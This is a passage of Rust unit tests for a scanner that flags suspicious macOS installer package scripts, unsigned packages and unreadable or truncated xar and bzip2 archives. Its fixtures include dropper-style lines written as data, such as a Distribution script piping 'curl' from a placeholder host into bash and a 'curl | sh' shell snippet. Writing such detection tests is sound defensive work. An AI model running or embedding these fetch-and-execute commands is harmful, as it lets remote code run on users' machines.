        let c = ctx("bz.pkg", &bzip2_distribution_pkg(blob));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded Distribution scores");
        assert!(
            signal.description.starts_with("distribution script:"),
            "{}",
            signal.description
        );
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    /// A bzip2 `Distribution` missing its trailer still reads in libxar, so
    /// Installer runs it. The decoded part is scanned and the gap reported.
    #[test]
    fn a_trailerless_bzip2_dropper_distribution_scores_and_marks_incomplete() {
        let full = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
        let cut = crate::bzip2::cut_trailer(full);
        assert!(cut.len() < full.len());
        let bytes = bzip2_distribution_pkg(cut);

        let c = ctx("cut.pkg", &bytes);
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded part scores");
        assert!(
            signal.description.starts_with("distribution script:"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));

        let c = ctx("cut.pkg", &bytes);
        let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
        let r = crate::scan::scan_context(&c, &rules);
        assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
        assert_eq!(r.signals.len(), 1);
    }

    /// Same cut, nothing found: unreadable, never clean.
    #[test]
    fn a_trailerless_bzip2_benign_distribution_is_not_applicable() {
        let full = include_bytes!("../../testdata/bzip2/distribution_ordinary.in");
        let cut = crate::bzip2::cut_trailer(full);
        let c = ctx("cut.pkg", &bzip2_distribution_pkg(cut));
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        // Intact, it is clean.
        let c = ctx("ok.pkg", &bzip2_distribution_pkg(full));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    /// A corrupt bzip2 Distribution is unreadable, not clean.
    #[test]
    fn a_corrupt_bzip2_distribution_is_not_applicable() {
        let mut blob = include_bytes!("../../testdata/bzip2/distribution_dropper.in").to_vec();
        blob[10] ^= 0x80; // block CRC
        for blob in [blob.as_slice(), b"BZh91AY&SY\x01\x02\x03\x04 junk"] {
            let c = ctx("bad.pkg", &bzip2_distribution_pkg(blob));
            assert!(matches!(
                InstallerScriptRule.evaluate(&c),
                Err(RuleOutcome::NotApplicable)
            ));
        }
    }

    /// A product-style xar with a readable dropper `Distribution` and a
    /// `Scripts` entry whose bytes are not a cpio archive, in either TOC order.
    fn dropper_with_garbage_scripts(scripts_first: bool) -> Vec<u8> {
        let dist = br#"<a><script>system.run("/bin/bash", "-c", "curl -fsSL https://example-cdn.invalid/a.sh | /bin/bash");</script></a>"#;
        let garbage = b"not a gzip or cpio archive at all";
        let entry = |id: u32, name: &str, off: usize, len: usize| {
            format!(
                r#"<file id="{id}"><name>{name}</name><type>file</type><data><offset>{off}</offset><length>{len}</length><size>{len}</size><encoding style="application/octet-stream"/></data></file>"#
            )
        };
        let (d_off, s_off) = if scripts_first {
            (garbage.len(), 0)
        } else {
            (0, dist.len())
        };
        let d = entry(1, "Distribution", d_off, dist.len());
        let s = entry(2, "Scripts", s_off, garbage.len());
        let toc = if scripts_first { s + &d } else { d + &s };
        let mut bytes = xar::toc_xar_bytes(&toc);
        if scripts_first {
            bytes.extend_from_slice(garbage);
            bytes.extend_from_slice(dist);
        } else {
            bytes.extend_from_slice(dist);
            bytes.extend_from_slice(garbage);
        }
        bytes
    }

    #[test]
    fn a_finding_survives_an_unreadable_sibling_entry_and_marks_incomplete() {
        for scripts_first in [false, true] {
            let c = ctx("p.pkg", &dropper_with_garbage_scripts(scripts_first));
            let signal = InstallerScriptRule
                .evaluate(&c)
                .expect("evaluates")
                .expect("the readable Distribution still scores");
            assert!(
                signal.description.starts_with("distribution script:"),
                "{}",
                signal.description
            );
            assert!(c.marked_incomplete("installer-script-suspicious"));

            let c = ctx("p.pkg", &dropper_with_garbage_scripts(scripts_first));
            let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
            let r = crate::scan::scan_context(&c, &rules);
            assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
            assert_eq!(r.signals.len(), 1);
        }
    }

    /// A product-style xar whose only entry is a stored `Distribution`.
    fn pkg_with_distribution(dist: &[u8]) -> Vec<u8> {
        let toc = format!(
            r#"<file id="1"><name>Distribution</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="application/octet-stream"/></data></file>"#,
            n = dist.len()
        );
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(dist);
        bytes
    }

    /// Under 256 bytes, so only the script-extension path makes it "text"
    /// for the name markers.
    #[test]
    fn a_short_distribution_script_is_scored_as_script_text() {
        let dist = br#"<a><script>system.run("/usr/bin/osascript", "-e", "x");</script></a>"#;
        assert!(dist.len() < 256);
        let c = ctx("short.pkg", &pkg_with_distribution(dist));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("fires");
        assert!(
            signal.description.contains("references osascript"),
            "{}",
            signal.description
        );
    }

    #[test]
    fn a_clean_read_does_not_mark_incomplete() {
        let c = ctx("d.pkg", pkg!("distribution_dropper"));
        let _ = InstallerScriptRule.evaluate(&c);
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    #[test]
    fn non_packages_are_not_this_rules_concern() {
        for (name, body) in [
            ("notes.txt", b"just some text".as_slice()),
            ("script.sh", b"#!/bin/sh\ncurl http://x | sh\n".as_slice()),
            ("empty", b"".as_slice()),
        ] {
            assert!(
                matches!(InstallerScriptRule.evaluate(&ctx(name, body)), Ok(None)),
                "{name}"
            );
            assert!(
                matches!(UnsignedPackageRule.evaluate(&ctx(name, body)), Ok(None)),
                "{name}"
            );
        }
    }

    /// A container we couldn't read in full must degrade completeness, not pass clean.
    #[test]
    fn an_unreadable_package_is_not_applicable() {
        let full = pkg!("benign");
        // Truncated so the TOC's byte range is no longer present.
        let c = ctx("benign.pkg", &full[..40]);
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        assert!(matches!(
            UnsignedPackageRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    #[test]
    fn pkgbuild_output_is_unsigned() {
        let c = ctx("benign.pkg", pkg!("benign"));
        let signal = UnsignedPackageRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("pkgbuild output carries no signature");
        assert_eq!(signal.id, "unsigned-installer-package");
        assert_eq!(signal.category, SignalCategory::ProvenanceConcern);
        assert!(signal.weight < 15, "must not alert on its own");
    }

    fn truncated_ctx(name: &str, body: &[u8]) -> ScanContext {
        ScanContext {
            truncated: true,
            ..ctx(name, body)
        }
    }

    /// Content starting with the xar magic might hide the deciding bytes
    /// (TOC, scripts, signature) past the cap — not covered.
    #[test]
    fn covers_truncation_false_for_xar_magic() {
        let c = truncated_ctx("x.pkg", b"xar!\x00\x1c\x00\x01");
        assert!(!InstallerScriptRule.covers_truncation(&c));
        assert!(!UnsignedPackageRule.covers_truncation(&c));
    }

    /// Content that plainly isn't a xar archive has nothing this rule could
    /// have missed past the cap.
    #[test]
    fn covers_truncation_true_for_non_xar_content() {
        let c = truncated_ctx("app", b"\xfe\xed\xfa\xcf");
        assert!(InstallerScriptRule.covers_truncation(&c));
        assert!(UnsignedPackageRule.covers_truncation(&c));
    }

    fn signed_toc_ctx(toc_body: &str, tail: usize) -> ScanContext {
        let mut bytes = crate::xar::toc_xar_bytes(toc_body);
        bytes.extend(std::iter::repeat(0u8).take(tail));
        ctx("p.pkg", &bytes)
    }

    fn fires_unsigned(c: &ScanContext) -> bool {
        matches!(UnsignedPackageRule.evaluate(c), Ok(Some(_)))
    }

    #[test]
    fn a_bare_top_level_signature_does_not_count_as_signed() {
        assert!(fires_unsigned(&signed_toc_ctx(
            r#"<signature style="RSA"/>"#,
            64
        )));
    }

    #[test]
    fn a_nested_only_signature_does_not_count_as_signed() {
        let body = r#"<file id="1"><name>x</name><signature style="RSA"><offset>0</offset><size>8</size></signature></file>"#;
        assert!(fires_unsigned(&signed_toc_ctx(body, 64)));
    }

    #[test]
    fn a_signature_range_past_the_archive_end_does_not_count_as_signed() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>1000</size></signature>"#;
        assert!(fires_unsigned(&signed_toc_ctx(body, 64)));
        let body = r#"<signature style="RSA"><offset>1000</offset><size>8</size></signature>"#;
        assert!(fires_unsigned(&signed_toc_ctx(body, 64)));
    }

    #[test]
    fn an_in_range_top_level_signature_counts_as_signed() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>64</size></signature>"#;
        assert!(matches!(
            UnsignedPackageRule.evaluate(&signed_toc_ctx(body, 64)),
            Ok(None)
        ));
    }

    /// The range is checked against the true file length, not the held
    /// prefix, so a signature past a truncated capture still counts.
    #[test]
    fn a_signature_past_the_held_prefix_but_within_the_file_counts_as_signed() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>64</size></signature>"#;
        let full = signed_toc_ctx(body, 64);
        let held = full.content.as_ref().unwrap().len() - 64;
        let c = ScanContext {
            content: Some(full.content.as_ref().unwrap()[..held].to_vec()),
            truncated: true,
            file_len: full.file_len,
            ..full
        };
        assert!(matches!(UnsignedPackageRule.evaluate(&c), Ok(None)));
    }

    /// On a truncated embedded capture the length is only what was captured,
    /// so a signature range past it is undetermined, not bogus.
    #[test]
    fn a_signature_past_a_truncated_embedded_capture_is_not_applicable() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>1000</size></signature>"#;
        let full = signed_toc_ctx(body, 64);
        let c = ScanContext {
            source: ContentSource::Embedded,
            truncated: true,
            ..full
        };
        assert!(matches!(
            UnsignedPackageRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    /// Different categories on purpose — see module docs.
    #[test]
    fn the_two_package_rules_are_independent_categories() {
        assert_ne!(
            InstallerScriptRule.category(),
            UnsignedPackageRule.category()
        );
    }
}
